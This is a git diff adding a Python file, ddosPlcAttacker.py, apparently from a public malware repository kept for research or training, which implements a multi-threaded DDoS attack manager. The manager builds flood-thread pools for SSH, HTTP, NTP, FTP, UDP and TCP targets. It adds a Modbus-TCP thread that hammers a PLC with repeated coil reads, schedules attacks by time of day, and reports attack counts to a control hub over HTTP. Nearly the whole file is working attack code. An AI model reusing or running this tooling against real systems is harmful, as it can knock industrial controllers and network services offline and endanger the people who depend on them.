@@ -1,0 +1,357 @@
+#-----------------------------------------------------------------------------
+# Name:        ddosPlcAttacker.py
+#
+# Purpose:     This module is a extend class module of the ddos attack system 
+#              https://github.com/LiuYuancheng/Python_Malwares_Repo/tree/main/src/ddosAttacker
+#              to implement the MobBus-TCP DDoS attack on PLC system. 
+#
+# Author:      Yuancheng Liu
+#
+# Created:     2024/01/13
+# Version:     v_0.1
+# Copyright:   Copyright (c) 2024 LiuYuancheng
+# License:     MIT License  
+#-----------------------------------------------------------------------------
+
+import os
+import sys
+import time
+import json
+import requests
+from datetime import datetime
+
+#-----------------------------------------------------------------------------
+print("Current working directory is : %s" % os.getcwd())
+DIR_PATH = dirpath = os.path.dirname(__file__)
+# DIR_PATH = dirpath = os.path.dirname(os.path.realpath(__file__))
+
+print("Current source code location : %s" % dirpath)
+# Attack config file.
+CONFIG_FILE_NAME = 'ddosAttackCfg.txt'
+
+#-----------------------------------------------------------------------------
+# config the lib directory
+TOPDIR = 'src'
+LIBDIR = 'lib'
+
+idx = dirpath.find(TOPDIR)
+gTopDir = dirpath[:idx + len(TOPDIR)] if idx != -1 else dirpath   # found it - truncate right after TOPDIR
+# Config the lib folder 
+gLibDir = os.path.join(gTopDir, LIBDIR)
+if os.path.exists(gLibDir):
+    sys.path.insert(0, gLibDir)
+
+#-----------------------------------------------------------------------------
+# init the config loader
+import ConfigLoader
+gGonfigPath = os.path.join(dirpath, CONFIG_FILE_NAME)
+iConfigLoader = ConfigLoader.ConfigLoader(gGonfigPath, mode='r')
+if iConfigLoader is None:
+    print("Error: The config file %s is not exist.Program exit!" %str(gGonfigPath))
+    exit()
+CONFIG_DICT = iConfigLoader.getJson()
+
+# init the config file attack type keys
+TEST_ATK_TYPE = 'TEST'
+SSH_ATK_TYPE = 'SSH'
+HTTP_ATK_TYPE = 'URL'       # Normal URL parsing. 
+HTTP2_ATK_TYPE = 'URL2'     # HTTP/HTTPS GET/POST request.
+NTP_ATK_TYPE = 'NTP'
+FTP_ATK_TYPE = 'FTP'
+TCP_ATK_TYPE = 'TCP'
+UDP_ATK_TYPE = 'UDP'
+TCP_ATK_TYPE = 'TCP'
+MDBS_ATK_TYPE = 'MODBUS'
+
+DEFAULT_TH_NUM = 20 # default attack thread pool capacity
+
+# import the util function
+import ddosAttackUtil
+import modbusTcpCom
+
+#-----------------------------------------------------------------------------
+class testAttacker(object):
+
+    def __init__(self) -> None:
+        pass
+    
+    def stop():
+        pass 
+
+#-----------------------------------------------------------------------------
+#-----------------------------------------------------------------------------
+class DDosAttackMgr(object):
+    """ The ddos attack manager. This module is the main controller program to 
+        assemble different ddos attcker actors in to the attack-thread and plugin
+        the attack thread pool. It will :
+        1. Load the attack configuration information. 
+        2. Create the attack threads pool based on the user config. 
+        3. Start/stop the attack based on the config.
+        4. Report to the DDoS attack control hub. 
+    """
+    
+    def __init__(self) -> None:
+        self.ownId = CONFIG_DICT['OWN_ID']
+        self.threadPoolCount = int(CONFIG_DICT['ATK_TN']) if 'ATK_TN' in CONFIG_DICT.keys() else DEFAULT_TH_NUM
+        self.threadPool = []
+        # Start/Stop time need to be under format HHMMSS.
+        self.startT = int(CONFIG_DICT['ATK_ST']) if 'ATK_ST' in CONFIG_DICT.keys() else None
+        self.endT = int(CONFIG_DICT['ATK_ET']) if 'ATK_ET' in CONFIG_DICT.keys() else None
+        self.lastUpdateT = 0
+        self.terminate = False
+        self.totalAtkCount = 0  # count to record the total attack request to send.
+        self.avgAtkCount = 0 
+        self.attackState = 0    # 0 attack pause, 1 attck under progress.
+        self.attackTarget = None
+        # Init report hub info
+        self.reportHub = CONFIG_DICT['RPT_FLG'] if 'RPT_FLG' in CONFIG_DICT.keys() else False
+        self.hubIP = CONFIG_DICT['HUB_IP'] if 'HUB_IP' in CONFIG_DICT.keys() else '127.0.0.1'
+        self.hubPort = int(CONFIG_DICT['HUB_PORT']) if 'HUB_PORT' in CONFIG_DICT.keys() else 5000
+        self.initThreadPool()
+        
+    #-----------------------------------------------------------------------------
+    # define all the DDoS attack pool init function here: 
+    # Attack pool decorator 
+    def _initAtkPool(getAtkthread):
+        def inner(self, atkParm):
+            """ Init the attack thread and add the thread obj in the thread pool.
+                Args:atkParm (dict): related attack thread's config paramter dict() 
+            """
+            for idx in range(self.threadPoolCount):
+                attckThreadClient = getAtkthread(self, idx)
+                attckThreadClient.initAttacker(atkParm)
+                self.threadPool.append(attckThreadClient)
+        return inner
+
+    @_initAtkPool
+    def _intiTestAtkPool(self, idx):
+        threadID = 'test-Atk-%s' %str(idx)
+        attacker = testAttacker()
+        return ddosAttackUtil.attackThread(self, threadID, attacker)
+    
+    @_initAtkPool
+    def _initSSHAtkPool(self, idx):
+        threadID = 'ssh-Atk-%s' %str(idx)
+        return ddosAttackUtil.attackThreadSSH(self, threadID, None)
+
+    @_initAtkPool
+    def _initHTTPAtkPool(self, idx):
+        threadID = 'http-Atk-%s' %str(idx)
+        return ddosAttackUtil.attackThreadHttp(self, threadID, None)
+
+    @_initAtkPool
+    def _initNTPAtkPool(self, idx):
+        threadID = 'ntp-Atk-%s' %str(idx)
+        return ddosAttackUtil.attackThreadNtp(self, threadID, None)
+
+    @_initAtkPool
+    def _initFTPAtkPool(self, idx):
+        threadID = 'ftp-Atk-%s' %str(idx)
+        return ddosAttackUtil.attackThreadNtp(self, threadID, None)
+    
+    @_initAtkPool
+    def _initUDPAtkPool(self, idx):
+        threadID = 'udp-Atk-%s' %str(idx)
+        return ddosAttackUtil.attackThreadUDP(self, threadID, None)
+
+    @_initAtkPool
+    def _initTCPAtkPool(self, idx):
+        threadID = 'tcp-Atk-%s' %str(idx)
+        return ddosAttackUtil.attackThreadTCP(self, threadID, None)
+
+    #-----------------------------------------------------------------------------
+    def _initSpecialAtkPool(self, atkParm):
+        """ Add the special attacker in the pool, this private function 
+            need to be over write by the child class. Class inherance example:
+            
+            def _initSpecialAtkPoolExample(self, atkParm):
+                for idx in range(self.threadPoolCount):
+                    attckThreadClient = ddosAttackUtil.attackThreadxxx(self, idx)
+                    attckThreadClient.initAttacker(atkParm)
+                    self.threadPool.append(attckThreadClient)
+
+            Args:
+                idx (dict()): atkParm
+
+            Returns:
+                _type_: _description_
+        """
+        return None 
+    
+    #-----------------------------------------------------------------------------
+    def _loadCfgParam(self):
+        """ load the attack parameters from the config file."""
+        paramPath = os.path.join(DIR_PATH, CONFIG_DICT['ATK_JSON'])
+        paramJson = None
+        if not os.path.exists(paramPath):
+            print("The parameter config file is not exist.")
+            return None
+        try:
+            with open(paramPath) as fh:
+                paramJson = json.load(fh)
+        except Exception as err:
+            print("Error: open paramter config file error: %s" %str(err))
+            return None 
+        return paramJson
+
+    #-----------------------------------------------------------------------------
+    def initThreadPool(self):
+        atkType =  CONFIG_DICT['ATK_TYPE']
+        paramJson = self._loadCfgParam()
+        if paramJson is None: return None
+        self.attackTarget = paramJson[atkType]['targetSum']
+        print('Start to init the [%s] attack pool for target [%s].' %(str(atkType), str(self.attackTarget)))
+        if atkType == TEST_ATK_TYPE:
+            self._intiTestAtkPool(None)
+        elif atkType == SSH_ATK_TYPE:
+            self._initSSHAtkPool(paramJson[SSH_ATK_TYPE])
+        elif atkType == HTTP_ATK_TYPE or atkType == HTTP2_ATK_TYPE:
+            self._initHTTPAtkPool(paramJson[HTTP_ATK_TYPE])
+        elif atkType == NTP_ATK_TYPE:
+            self._initNTPAtkPool(paramJson[NTP_ATK_TYPE])
+        elif atkType == FTP_ATK_TYPE:
+            self._initFTPAtkPool(paramJson[FTP_ATK_TYPE])
+        elif atkType == UDP_ATK_TYPE:
+            self._initUDPAtkPool(paramJson[UDP_ATK_TYPE])
+        elif atkType == TCP_ATK_TYPE:
+            self._initTCPAtkPool(paramJson[TCP_ATK_TYPE])
+        else:
+            print('The attack type [%s] is not supported by default!' % str(atkType))
+            print('Call the spcial attack pool init function')
+            self._initSpecialAtkPool(paramJson[atkType])
+        # Start all the attack threads.
+        for attckThreadClient in self.threadPool:
+            attckThreadClient.start()
+        print("All the attack theads ready.")
+
+    #-----------------------------------------------------------------------------
+    def run(self):
+        """ Program main attack launch execution loop."""
+        # Start wait 
+        nowT = self.lastUpdateT = int(datetime.now().strftime('%H%M%S'))
+        if (not self.startT is None) and nowT <= self.startT:
+            waitInv = self.startT - nowT
+            print("- Wait %s min to start attack." %str(waitInv//60))
+            time.sleep(waitInv)
+        print("All thread start launch attack.")
+        self.startAttack()
+        while not self.terminate:
+            time.sleep(1)
+            nowT = int(datetime.now().strftime('%H%M%S'))
+            if self.endT and nowT >= self.endT:
+                print("Stop attack.")
+                self.pauseAttack()
+                break
+            # calcuate the attack data flow count per min
+            if nowT - self.lastUpdateT >= 60 : 
+                self.calAttackFreq(nowT)
+                self.reportTohub()
+                self.lastUpdateT = nowT
+            
+        print("Main thead stopped.")
+
+    #-----------------------------------------------------------------------------
+    def calAttackFreq(self, timeInt):
+        """ Calculate the print the attack frequency."""
+        count = self.getTotalAtkCount()
+        self.avgAtkCount = count - self.totalAtkCount
+        print("DDoS Attack data flow [%s] : %s / min" %(str(timeInt), str(self.avgAtkCount)))
+        self.totalAtkCount = count
+
+    #-----------------------------------------------------------------------------
+    def getTotalAtkCount(self):
+        count = 0 
+        for client in self.threadPool:
+            atkState = client.getAttackState()
+            count += int(atkState[1])
+        return count
+
+    #-----------------------------------------------------------------------------
+    def startAttack(self):
+        for client in self.threadPool:
+            client.setStartAtk(True)
+        self.attackState = 1
+
+    def pauseAttack(self):
+        for client in self.threadPool:
+            client.setStartAtk(False)
+        self.attackState = 0
+
+    #-----------------------------------------------------------------------------
+    def postData(self, postUrl, jsonDict):
+        try:
+            res = requests.post(postUrl, json=jsonDict)
+            if res.ok: 
+                print("http server reply: %s" %str(res.json()))
+                return res.json()
+        except Exception as err:
+            print("http server not reachable, error: %s" %str(err))
+
+    #-----------------------------------------------------------------------------
+    def reportTohub(self):
+        """ Report to the hub the attack progress."""
+        if not self.reportHub: return None
+        atkType =  CONFIG_DICT['ATK_TYPE']
+        target = self.attackTarget if self.attackTarget else 'n.a'
+        jsonDict = {
+            'id': self.ownId,
+            'type': atkType,
+            'threads': self.threadPoolCount ,
+            'count': self.avgAtkCount,
+            'target': target,
+            'state': 1
+        }
+        reportUrl = "http://%s:%s/dataPost/" % (self.hubIP, str(self.hubPort))
+        reportUrl += str(jsonDict['id'])
+        self.postData(reportUrl, jsonDict)
+
+#-----------------------------------------------------------------------------
+    def stop(self):
+        self.pauseAttack()
+        print("Stop-1: all the attack thread paused.")
+        for client in self.threadPool:
+            client.stop()
+        print("Stop-2: all the attack thread stopped.")
+        self.terminate = True
+        
+#-----------------------------------------------------------------------------
+#-----------------------------------------------------------------------------
+class attackThreadSSH(ddosAttackUtil.attackThread):
+    """ Attack thread to init a Modbus client to implement the PLC connection."""
+
+    def __init__(self, parent, threadID, attackActor, repeatTime=None) -> None:
+        super().__init__(parent, threadID, attackActor)
+        pass
+
+    def initAttacker(self, paramDict):
+        self.attackActor = modbusTcpCom.modbusTcpClient(paramDict['ipaddress'], tgtPort=int(paramDict['port']))
+        while not self.attackActor.checkConn():
+            print('Try connect to the PLC')
+            print(self.attackActor.getCoilsBits(0, 4))
+            time.sleep(0.5)
+        
+    def _runAttack(self):
+        self.attackActor.getCoilsBits(0, 4)
+
+#-----------------------------------------------------------------------------
+#-----------------------------------------------------------------------------
+class ddosPlcAttacker(DDosAttackMgr):
+
+    def __init__(self) -> None:
+        super().__init__()
+
+    def _initSpecialAtkPool(self, atkParm):
+        for idx in range(self.threadPoolCount):
+            attckThreadClient = attackThreadSSH(self, idx, None)
+            attckThreadClient.initAttacker(atkParm)
+            self.threadPool.append(attckThreadClient)
+
+#-----------------------------------------------------------------------------
+#-----------------------------------------------------------------------------
+def main():
+    ddosAttacker = ddosPlcAttacker()
+    ddosAttacker.run()
+
+#-----------------------------------------------------------------------------
+if __name__ == '__main__':
+    main()
